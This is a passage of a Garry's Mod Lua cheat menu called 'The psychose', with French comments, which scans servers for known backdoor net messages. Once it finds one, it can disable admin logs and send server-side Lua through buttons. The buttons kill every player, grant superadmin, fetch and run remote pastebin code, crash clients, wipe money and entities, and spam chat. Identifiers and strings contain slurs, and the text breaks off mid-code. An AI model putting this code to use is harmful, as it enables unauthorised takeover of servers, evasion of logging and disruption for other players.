MsgC (Color(math.random(1,25),math.random(1,25),math.random(1,25)), [[
CHARGEMENT DU MENU EN COURS...


psychosition
  
 
  ]])
--[[-----------
TOUS LES RACCOURCIS LOCAL
--------------]] 
local FAUCHEUSE = {}
FAUCHEUSE.memory = {}
local ulxdied = CreateClientConVar("ulxdied", 0, false, false);
local msgchat = chat.AddText
local ply = LocalPlayer()
local psychose = nil 
local noir = Color ( 0,0,0,255 )
local blanc = Color ( 255,255,255,255 )
local vert = Color ( 2,200,21,100 )
local bleu = Color ( 2,18,255,255 )
local cyan = Color ( 0,119,206,255 )
local asuna = Color ( 236,111,0,255 )
local rouge = Color ( 190,0,0,255 )
local multicolore = Color (math.random(1,255),math.random(1,255),math.random(1,255))
local lil = Color ( 141,0,158,255 )
local chocolat = Color ( 111,42,0,255 )
local gris = Color ( 119,119,119,255 )
local gaymen = Color ( 240,113,196,255 )
local mer = Color ( 28,41,152,255 )
local elfamosabackdoormdr = "";
--[[-----------
TOUS LES RACCOURCIS LOCAL
--------------]]
function Estcequecetrucmarcheoupasmec( str )
    local status, error = pcall( net.Start, str )
    return status
end

--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]
RunConsoleCommand "stopsound"

--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]

hook.Add("HUDPaint", "ACTIVATED", function() draw.SimpleTextOutlined( "The psychose 1.2 Actif", "menuouvert", ScrW()/2 + math.sin(RealTime()) * ScrW() / 2.500, ScrH()/1.050, Color(math.random(1,255),math.random(1,255),math.random(1,255)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255)) end)

--[[-----------
FUNCTIONS
--------------]]
function FAUCHEUSE.ChatText( str )
msgchat(Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[ [The psychose]: ]]..str )
end
function FAUCHEUSE.NetStart( str )
local netstart = net.Start
if psychose and psychose.G and psychose.G.net then
netstart = psychose.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function FAUCHEUSE.Estcequecetrucmarcheoupasmec( str )
local netstart = net.Start
if psychose and psychose.G and psychose.G.net then
netstart = psychose.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function FAUCHEUSE.Estcequecetrucmarcheoupasmec( str )
local status, error = pcall( net.Start, str )
return status
end
    
function nikelesrageux(ply)
if ply:IsPlayer() then 
for k,v in pairs(ply:GetWeapons()) do
net.Start("properties")
net.WriteString( "remove" , 32 )
net.WriteEntity( v )
net.SendToServer()
            end
        end
    end
--[[-----------
FUNCTIONS
--------------]]


--[[-----------
MUSIQUE LOADING MENU
--------------]]
sound.PlayURL ( "http://zilnix.mtxserv.fr/Zilnix/shykid.mp3", "mono", function( station )
	if ( IsValid( station ) ) then

		station:SetPos( LocalPlayer():GetPos() )

		station:Play()
	else

		LocalPlayer():ChatPrint( "Echec Du Chargement De La Musique :/" )

	end
end )
--[[-----------
MUSIQUE LOADING MENU
--------------]]

--[[-----------
POLICES D'ECRITURE
--------------]]
surface.CreateFont( "Titre", {
        font = "Lato Light",
        size = 50,
        weight = 1000,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 100,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

surface.CreateFont("Erreurmdr", {
    font = "Segoe UI Light",
    size = 40,
    weight = 600
})

surface.CreateFont("Guillaume", {
    font = "Segoe UI Light",
    size = 500,
    weight = 300
})

surface.CreateFont("THEMENUOPENING78", {
font = "Segoe UI Light",
size = 47,
weight = 300
})

surface.CreateFont("jspquoimettre", {
font = "Segoe UI Light",
size = 27,
weight = 700
})

surface.CreateFont("fermermenu", {
font = "Lato Light",
size = 25,
weight = 1000
})

surface.CreateFont("menuouvert", {
font = "Lato Light",
size = 40,
weight = 1000
})

--[[-----------
POLICES D'ECRITURE
--------------]]

--[[-----------
JOUEURS MULTICOLORE
--------------]]
hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)
--[[-----------
JOUEURS MULTICOLORE
--------------]]


--[[-----------
NOTIFICATIONS MENU
--------------]]
function Notifications(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 1920, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, notify:GetTall() - 50, w, 50, HSVToColor( CurTime() % 15 * 150, 10, 10 ))
    draw.SimpleText( text, "Titre", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 5, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
--[[-----------
NOTIFICATIONS MENU
--------------]]

--[[-----------
OUVERTURE MENU
--------------]]
surface.PlaySound("buttons/blip1.wav")
Notifications("The psychose Activé " .. ply:GetName() .." Amuse toi bien :D")
--[[-----------
OUVERTURE MENU
--------------]]

--[[-----------
FONCTION .NET
--------------]]
    if( Estcequecetrucmarcheoupasmec("memeDoor") ) then
        elfamosabackdoormdr = "memeDoor"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Sandbox_Armdupe") ) then 
        elfamosabackdoormdr = "Sandbox_Armdupe"
    else
    end

    if( Estcequecetrucmarcheoupasmec("DarkRP_AdminWeapons") ) then
        elfamosabackdoormdr = "DarkRP_AdminWeapons"
    else
    end

    if( Estcequecetrucmarcheoupasmec("SessionBackdoor") ) then
        elfamosabackdoormdr = "SessionBackdoor"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Fix_Keypads") ) then
        elfamosabackdoormdr = "Fix_Keypads"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Remove_Exploiters") ) then
        elfamosabackdoormdr = "Remove_Exploiters"
    else
    end

    if( Estcequecetrucmarcheoupasmec("noclipcloakaesp_chat_text") ) then
        elfamosabackdoormdr = "noclipcloakaesp_chat_text"
    else
    end

    if( Estcequecetrucmarcheoupasmec("_Defqon") ) then
        elfamosabackdoormdr = "_Defqon"
    else
    end

    if( Estcequecetrucmarcheoupasmec("_CAC_ReadMemory") ) then
        elfamosabackdoormdr = "_CAC_ReadMemory"
    else
    end

    if( Estcequecetrucmarcheoupasmec("nostrip") ) then
        elfamosabackdoormdr = "nostrip"
    else
    end

    if( Estcequecetrucmarcheoupasmec("LickMeOut") ) then
        elfamosabackdoormdr = "LickMeOut"
    else
    end

    if( Estcequecetrucmarcheoupasmec("MoonMan") ) then
        elfamosabackdoormdr = "MoonMan"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Im_SOCool") ) then
        elfamosabackdoormdr = "Im_SOCool"
    else
    end

    if( Estcequecetrucmarcheoupasmec("ULXQUERY2") ) then
        elfamosabackdoormdr = "ULXQUERY2"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("thereaper") ) then
        elfamosabackdoormdr = "thereaper"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("noprop") ) then
        elfamosabackdoormdr = "noprop"
    else
    end

    if( Estcequecetrucmarcheoupasmec("enablevac") ) then
        elfamosabackdoormdr = "enablevac"
    else
    end

    if( Estcequecetrucmarcheoupasmec("c") ) then
        elfamosabackdoormdr = "c"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("Þ� ?D)◘") ) then
        elfamosabackdoormdr = "Þ� ?D)◘"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("disablebackdoor") ) then
        elfamosabackdoormdr = "disablebackdoor"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("kill") ) then
        elfamosabackdoormdr = "kill"
    else
    end

    if( Estcequecetrucmarcheoupasmec("dontforget") ) then
        elfamosabackdoormdr = "dontforget"
    else
    end

    if elfamosabackdoormdr == "" then
         chat.AddText(Color( 0, 0, 0 ), "[", "The psychose", "] ", Color( 255, 0, 0 ), "Ah, aucune backdoor içi :(" )
    else
        chat.AddText(Color( 0, 0, 0 ), "[", "The psychose", "] ", Color( 150, 0, 0 ), "Jackpot ! Il y a la backdoor ".. elfamosabackdoormdr .." sur le serveur !" )
            if GetConVarNumber("ulxdied") == 1 then
                net.Start(elfamosabackdoormdr)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(elfamosabackdoormdr)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("Logs Désactivé :D." )
                end)
            end
    end
--[[-----------
FONCTION .NET
--------------]]

--[[-----------
LE STRIP 
--------------]]
function jefaitlenculer() 
    for k,v in pairs(player.GetAll()) do
        nikelesrageux(v)
    end
end

--[[-----------
LE STRIP
--------------]] 

--[[-----------
MENU GUI
--------------]]
concommand.Add("psychosemenu",function( )
    local LMAOCEJEUDECANCER = vgui.Create("DFrame")
        LMAOCEJEUDECANCER:SetSize(450,750)
        LMAOCEJEUDECANCER:SetTitle("PSYCHOSE MENU BY A LEAKER")
        LMAOCEJEUDECANCER:MakePopup()
		LMAOCEJEUDECANCER:Center()
		LMAOCEJEUDECANCER:ShowCloseButton(false)
        LMAOCEJEUDECANCER.Paint = function()
        --Main back
        surface.SetDrawColor(255, 95, 0)
        surface.DrawRect(4,4,LMAOCEJEUDECANCER:GetWide()-8,LMAOCEJEUDECANCER:GetTall()-8)
		LMAOCEJEUDECANCER.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
		draw.DrawText( "The psychose", "Titre", 120, 50, Color(175, 0, 0, 255) )
        end
			end

local jadoreetreuncancerdegmod = vgui.Create("DButton", LMAOCEJEUDECANCER)
jadoreetreuncancerdegmod:SetPos( 200, 5 )
jadoreetreuncancerdegmod:SetSize( 53, 20 )
jadoreetreuncancerdegmod:SetFont( "fermermenu" )
jadoreetreuncancerdegmod:SetText( "X" )
jadoreetreuncancerdegmod:SetTextColor( rouge )
function jadoreetreuncancerdegmod:Paint( w, h )
    draw.RoundedBox( 10, 0, 0, w, h, Color(0,0,0, 240) )
end

jadoreetreuncancerdegmod.DoClick = function()
    LMAOCEJEUDECANCER:Close()  
end 

--[[-----------
MENU GUI
--------------]]


--[[-----------
MENU COMMANDES
--------------]]
local SOFUNNY = vgui.Create( "DPropertySheet", LMAOCEJEUDECANCER )
SOFUNNY:Dock( FILL )
SOFUNNY:DockPadding( 25, 0, 0, 0)
SOFUNNY.Paint = function (self, w, h)
for k, v in pairs(SOFUNNY.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.RoundedBox(10, 0, 0, w +0, h-1, Color(15,15,15,240))
    end
end
end

 local WELCOME = vgui.Create( "DPanel", SOFUNNY )
        WELCOME.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,WELCOME:GetWide()-8,WELCOME:GetTall()-8)
		end
		WELCOME.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Accueil", WELCOME, "icon16/layout.png" )


local DESTROYSERVER = vgui.Create( "DPanel", SOFUNNY )
        DESTROYSERVER.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,DESTROYSERVER:GetWide()-8,DESTROYSERVER:GetTall()-8)
		end
		DESTROYSERVER.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Commandes", DESTROYSERVER, "icon16/bug.png" )

--[[-----------
MENU COMMANDES
--------------]]

--[[-----------
BOUTONS COMMANDES
--------------]]
local DESTROYSERVER = vgui.Create( "DScrollPanel", DESTROYSERVER )
DESTROYSERVER:Dock( FILL )
DESTROYSERVER:InnerWidth(100)
local sbar = DESTROYSERVER:GetVBar()
function DESTROYSERVER:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
   local PetiteFaux = DESTROYSERVER:Add( "DButton")
        PetiteFaux:SetSize(375,25)
        PetiteFaux:SetPos(27,60)
		PetiteFaux:SetFont("jspquoimettre")
        PetiteFaux:SetTextColor(noir)
        PetiteFaux:SetText("Tuer Tous Le Monde")
        PetiteFaux.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux.DoClick = function ()
		Notifications("Tous le monde est mort !")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local PetiteFaux2 = DESTROYSERVER:Add( "DButton")
        PetiteFaux2:SetSize(375,25)
        PetiteFaux2:SetPos(27,100)
		PetiteFaux2:SetFont("jspquoimettre")
        PetiteFaux2:SetTextColor(noir)
        PetiteFaux2:SetText("Mettre Tous Le Serveur Superadmin")
        PetiteFaux2.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux2.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux2.DoClick = function ()
		Notifications("Tous le monde est devenu Superadmin !")
        net.Start(elfamosabackdoormdr)
        net.WriteString("RunConsoleCommand(\"fadmin\", \"setaccess\", \"Bully\", \"superadmin\")")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
   local PetiteFaux3 = DESTROYSERVER:Add( "DButton")
        PetiteFaux3:SetSize(375,25)
        PetiteFaux3:SetPos(27,140)
		PetiteFaux3:SetFont("jspquoimettre")
        PetiteFaux3:SetTextColor(noir)
        PetiteFaux3:SetText("Activé Mode Super Asriel")
        PetiteFaux3.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux3.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux3.DoClick = function ()
		Notifications("Asriel Domine Désormais Le Serveur !")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/eUVnvQjn\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
   local PetiteFaux4 = DESTROYSERVER:Add( "DButton")
        PetiteFaux4:SetSize(375,25)
        PetiteFaux4:SetPos(27,180)
		PetiteFaux4:SetFont("jspquoimettre")
        PetiteFaux4:SetTextColor(noir)
        PetiteFaux4:SetText("Détruire L'économie Du Serveur")
        PetiteFaux4.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux4.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux4.DoClick = function ()
		Notifications("L'économie vien de disparaitre :')")
        net.Start(elfamosabackdoormdr)
		net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
   local PetiteFaux5 = DESTROYSERVER:Add( "DButton")
        PetiteFaux5:SetSize(375,25)
        PetiteFaux5:SetPos(27,220)
		PetiteFaux5:SetFont("jspquoimettre")
        PetiteFaux5:SetTextColor(noir)
        PetiteFaux5:SetText("Forcer Les Joueurs A Rire")
        PetiteFaux5.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux5.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux5.DoClick = function ()
		Notifications("Les Joueurs Se Mettent A Rire")
        net.Start(elfamosabackdoormdr)
		net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end timer.Create(\"rire_loop\",7.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end end )")
        net.WriteBit(1)
        net.SendToServer() 
        end

   local PetiteFaux6 = DESTROYSERVER:Add( "DButton")
        PetiteFaux6:SetSize(375,25)
        PetiteFaux6:SetPos(27,260)
		PetiteFaux6:SetFont("jspquoimettre")
        PetiteFaux6:SetTextColor(noir)
        PetiteFaux6:SetText("Activé The psychose")
        PetiteFaux6.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux6.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux6.DoClick = function ()
		Notifications("The psychose Is Here...")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3eZ2GfHD\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux7 = DESTROYSERVER:Add( "DButton")
        PetiteFaux7:SetSize(375,25)
        PetiteFaux7:SetPos(27,300)
		PetiteFaux7:SetFont("jspquoimettre")
        PetiteFaux7:SetTextColor(noir)
        PetiteFaux7:SetText("Activé DROP IT")
        PetiteFaux7.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux7.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux7.DoClick = function ()
		Notifications("Drop it :c")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3mG900sv\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end

	local PetiteFaux9 = DESTROYSERVER:Add( "DButton")
        PetiteFaux9:SetSize(375,25)
        PetiteFaux9:SetPos(27,340)
		PetiteFaux9:SetFont("jspquoimettre")
        PetiteFaux9:SetTextColor(noir)
        PetiteFaux9:SetText("Spam Chat")
        PetiteFaux9.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux9.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux9.DoClick = function ()
		Notifications("Spam Chat Lancé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("timer.Create( \"imafaggot\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(255,10),math.random(1,2),math.random(1,2)), \"J'adore être un cancer de gmod en utilisant le the psychose\")]]) end)")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux10 = DESTROYSERVER:Add( "DButton")
        PetiteFaux10:SetSize(375,25)
        PetiteFaux10:SetPos(27,380)
		PetiteFaux10:SetFont("jspquoimettre")
        PetiteFaux10:SetTextColor(noir)
        PetiteFaux10:SetText("Stop Spam Chat")
        PetiteFaux10.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux10.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux10.DoClick = function ()
		Notifications("Spam Chat Stoppé")
        net.Start(elfamosabackdoormdr)
        net.WriteString("timer.Stop( \"imafaggot\")")
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux11 = DESTROYSERVER:Add( "DButton")
        PetiteFaux11:SetSize(375,25)
        PetiteFaux11:SetPos(27,420)
		PetiteFaux11:SetFont("jspquoimettre")
        PetiteFaux11:SetTextColor(noir)
        PetiteFaux11:SetText("Crash Tous Sauf Les Users")
        PetiteFaux11.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux11.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux11.DoClick = function ()
		Notifications("Tous le monde a crash a par les users :D")
        net.Start(elfamosabackdoormdr)
        net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux12 = DESTROYSERVER:Add( "DButton")
        PetiteFaux12:SetSize(375,25)
        PetiteFaux12:SetPos(27,460)
		PetiteFaux12:SetFont("jspquoimettre")
        PetiteFaux12:SetTextColor(noir)
        PetiteFaux12:SetText("Crash Tous Sauf Les Superadmins")
        PetiteFaux12.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux12.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux12.DoClick = function ()
		Notifications("Tous le monde a crash a par les superadmins :D")
        net.Start(elfamosabackdoormdr)
        net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"superadmin\" ) then v:SendLua(\"while true do end\") end end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux13 = DESTROYSERVER:Add( "DButton")
        PetiteFaux13:SetSize(375,25)
        PetiteFaux13:SetPos(27,500)
		PetiteFaux13:SetFont("jspquoimettre")
        PetiteFaux13:SetTextColor(noir)
        PetiteFaux13:SetText("Supprimer Les Entitées & Props")
        PetiteFaux13.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux13.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux13.DoClick = function ()
		Notifications("Wow c'est vide maintenant :o")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux14 = DESTROYSERVER:Add( "DButton")
        PetiteFaux14:SetSize(375,25)
        PetiteFaux14:SetPos(27,540)
		PetiteFaux14:SetFont("jspquoimettre")
        PetiteFaux14:SetTextColor(noir)
        PetiteFaux14:SetText("Faire Voler Tout Le Serveur")
        PetiteFaux14.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux14.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux14.DoClick = function ()
		Notifications("Les voila en trains de voler c'est magnifique :D (l'attérissage sera pas très beau)")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux15 = DESTROYSERVER:Add( "DButton")
        PetiteFaux15:SetSize(375,25)
        PetiteFaux15:SetPos(27,580)
		PetiteFaux15:SetFont("jspquoimettre")
        PetiteFaux15:SetTextColor(noir)
        PetiteFaux15:SetText("Supprimer L'argent Du Serveur (DARKP)")
        PetiteFaux15.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux15.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux15.DoClick = function ()
		Notifications("Où est passer l'argent... :o")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux16 = DESTROYSERVER:Add( "DButton")
        PetiteFaux16:SetSize(375,25)
        PetiteFaux16:SetPos(27,620)
		PetiteFaux16:SetFont("jspquoimettre")
        PetiteFaux16:SetTextColor(noir)
        PetiteFaux16:SetText("Détruire La Gravité")
        PetiteFaux16.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux16.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux16.DoClick = function ()
		Notifications("Wow je m'envole")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-700\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux17 = DESTROYSERVER:Add( "DButton")
        PetiteFaux17:SetSize(375,25)
        PetiteFaux17:SetPos(27,660)
		PetiteFaux17:SetFont("jspquoimettre")
        PetiteFaux17:SetTextColor(noir)
        PetiteFaux17:SetText("Transformer La Terre En Lune")
        PetiteFaux17.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux17.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux17.DoClick = function ()
		Notifications("Gravité De La Lune YEAAAAAAAAH")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"20\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux18 = DESTROYSERVER:Add( "DButton")
        PetiteFaux18:SetSize(375,25)
        PetiteFaux18:SetPos(27,700)
		PetiteFaux18:SetFont("jspquoimettre")
        PetiteFaux18:SetTextColor(noir)
        PetiteFaux18:SetText("Coller Les Joueurs Au Sol")
        PetiteFaux18.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux18.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux18.DoClick = function ()
		Notifications("J'arrive plus a bouger :c")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"2200\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux19 = DESTROYSERVER:Add( "DButton")
        PetiteFaux19:SetSize(375,25)
        PetiteFaux19:SetPos(27,740)
		PetiteFaux19:SetFont("jspquoimettre")
        PetiteFaux19:SetTextColor(noir)
        PetiteFaux19:SetText("Anéantir La Physique")
        PetiteFaux19.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux19.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux19.DoClick = function ()
		Notifications("J'ai envie de vomir ._.")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-50\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
		
	local PetiteFaux20 = DESTROYSERVER:Add( "DButton")
        PetiteFaux20:SetSize(375,25)
        PetiteFaux20:SetPos(27,780)
		PetiteFaux20:SetFont("jspquoimettre")
        PetiteFaux20:SetTextColor(noir)
